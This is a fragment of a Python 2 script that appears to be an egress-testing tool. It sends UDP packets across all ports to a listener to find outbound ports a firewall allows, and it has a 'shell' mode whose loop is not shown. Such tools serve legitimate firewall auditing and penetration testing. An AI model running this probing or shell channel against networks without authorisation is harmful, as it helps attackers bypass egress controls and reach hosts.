...
NOTE: Supports all 65536 udp ports.
...
def start_socket(ipaddr, base_port, shell):
    ...
    if verbose or (base_port % 1000) == 0:
        print "[v] Trying: udp %s" % base_port

    # try block to catch exceptions
    try:
        socket.setdefaulttimeout(timeout)
        sockobj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sockobj.sendto(b'aaa', (ipaddr, base_port))
        resp = sockobj.recvfrom(8192)
        print "[*] Connection made to %s on port: %s/udp, resp with %s" % (ipaddr, base_port, resp)
        if shell == "shell":
            # start loop
            while 1:
    ...
    # if we throw an error
        ...
        sockobj.close()
        if verbose:
            print "[v] Can't use port: %s/udp" % base_port
...
if end_port > 65536:
    print "[i] Limiting to udp 65536..."
    end_port = 65536

print "[i] Sending packets to egress listener (%s)..." % ipaddr
print "[i] Starting at: %s/udp, ending at: %s/udp" % (base_port, end_port)
